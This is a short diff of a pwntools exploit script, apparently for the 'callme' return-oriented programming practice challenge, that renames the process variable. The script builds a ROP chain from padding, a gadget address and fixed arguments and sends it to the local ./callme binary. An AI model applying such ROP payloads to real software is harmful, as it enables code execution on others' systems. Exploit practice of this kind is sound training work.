@@ -5,10 +5,10 @@ context.arch = 'amd64'
 
 debug = False
 
-p = process('./callme')
+io = process('./callme')
 
 if debug:
-    print("pid for process @ %d" % p.pid)
+    print("pid for process @ %d" % io.pid)
     pause()
 
 arg1 = p64(0xdeadbeefdeadbeef)
@@ -23,6 +23,6 @@ gadget = p64(0x40093c)
 payload = junk + gadget + args + one
 payload += gadget + args + two
 payload += gadget + args + three
-p.recvuntil(b'> ')
-p.sendline(payload)
-p.interactive()
+io.recvuntil(b'> ')
+io.sendline(payload)
+io.interactive()
